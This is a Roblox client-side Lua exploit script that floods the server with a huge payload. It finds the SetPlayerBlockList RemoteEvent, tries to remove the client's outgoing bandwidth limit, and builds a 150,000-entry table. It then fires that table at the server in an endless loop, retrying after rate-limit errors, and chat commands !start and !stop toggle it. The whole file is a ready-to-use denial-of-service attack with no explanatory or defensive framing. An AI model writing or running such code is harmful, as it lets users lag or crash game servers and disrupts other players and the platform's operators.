--!nonstrict
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

local player = Players.LocalPlayer

-- ═══════════ CONFIG ═══════════
local Children       = 150000
local NestedPerChild = 0
local FieldsPerChild = 0
local FireBurst      = 1.5
local FrameDelay     = 0.125
local FieldSize      = 0
local RebuildEach    = false
local Format         = "pair"   -- pair | compact | flat
-- ══════════════════════════════

local RemoteCandidates = {
    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
    { "ReplicatedStorage",       "SetPlayerBlockList" },
}

local state = {
    running = false,
    cache = nil,
    remote = nil,
    errors = 0,
}

local function resolve()
    for _, path in ipairs(RemoteCandidates) do
        local node, ok = game, true
        for i = 1, #path do
            local nxt = node:FindFirstChild(path[i])
            if not nxt then ok = false; break end
            node = nxt
        end
        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
            return node
        end
    end
    return nil
end

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

local function build()
    local n = Children
    local root = table.create(n)

    if Format == "flat" then
        for i = 1, n do root[i] = i end
        return root
    end

    if Format == "compact" then
        for i = 1, n do root[i] = { i, i * 2 } end
        return root
    end

    local pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
    for i = 1, n do
        local entry = { id = i, v = i * 2 }
        for k = 1, FieldsPerChild do
            entry["k" .. k] = (FieldSize > 0) and pad or (i + k)
        end
        for j = 1, NestedPerChild do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
    end
    return root
end

-- ═══════════ INFINITE LOOP ═══════════
local function runLoop()
    -- build payload once (or every pass if RebuildEach)
    if RebuildEach or not state.cache then
        state.cache = build()
    end

    while state.running do
        if not state.remote then
            state.remote = resolve()
        end

        if state.remote then
            local ok = pcall(function()
                for _ = 1, FireBurst do
                    state.remote:FireServer(state.cache)
                end
            end)

            if ok then
                state.errors = 0
                task.wait(FrameDelay)
            else
                -- remote errored (rate limit, disconnect, etc.) — reset and retry
                state.errors += 1
                state.remote = nil
                task.wait(0.5)
            end
        else
            -- remote not found yet — keep trying
            task.wait(0.25)
        end
    end
end

local function start()
    if state.running then return end
    state.running = true
    state.errors = 0
    task.spawn(runLoop)
end

local function stop()
    state.running = false
    state.cache = nil
    state.remote = nil
    state.errors = 0
end

-- ═══════════ CHAT COMMANDS ═══════════
local started = false

local function onMessage(msg)
    local m = tostring(msg or ""):lower():gsub("^%s+", ""):gsub("%s+$", "")
    if m == "!start" then
        if not started then
            started = true
            pcall(start)
        end
    elseif m == "!stop" then
        if started then
            started = false
            pcall(stop)
        end
    end
end

-- Path 1: legacy / normal chat
pcall(function()
    player.Chatted:Connect(onMessage)
end)

-- Path 2: modern TextChatService
pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        if not message.TextSource then return end
        if message.TextSource.UserId ~= player.UserId then return end
        onMessage(message.Text)
    end)
end)
